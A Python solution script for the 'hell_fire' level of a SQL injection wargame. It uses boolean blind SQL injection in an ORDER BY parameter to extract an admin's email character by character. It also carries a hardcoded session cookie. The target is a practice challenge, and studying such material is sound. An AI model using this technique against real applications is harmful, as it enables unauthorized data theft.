import string
import requests


def find_password_length(n):
    payload = f"?order=if(id='admin' and LENGTH(email)>{n},1,3) -- "
    content = send_request(payload)
    if content.find('admin') > content.find('rubiya'):
        return n


def find_password(position, char):
    payload = f"?order=if(id='admin' and substring(email,{position},1)=char({char}),1,3) -- "
    content = send_request(payload)
    if content.find('admin') < content.find('rubiya'):
        return char


def send_request(payload):
    url = 'https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php'
    cookie = {'PHPSESSID': 'dutaujsbjbkbm42o5v5t948kfm'}
    r = requests.get(url + payload, cookies=cookie)
    return r.text


if __name__ == "__main__":
    email = []

    for i in range(100):
        if find_password_length(i):
            length = i
            print(f'email length is {length}')
            break

    for i in range(1, length + 1):
        for char in range(46, 128):
            if find_password(i, char):
                email.append(chr(char).lower())
                print(f'email = {email}')
                break

    print(f'email={"".join(email)}')

    if 'HELL_FIRE Clear!' in send_request(f'?order=1&email={"".join(email)}'):
        print('HELL_FIRE Clear!')
    else:
        print('Something went wrong!!!')
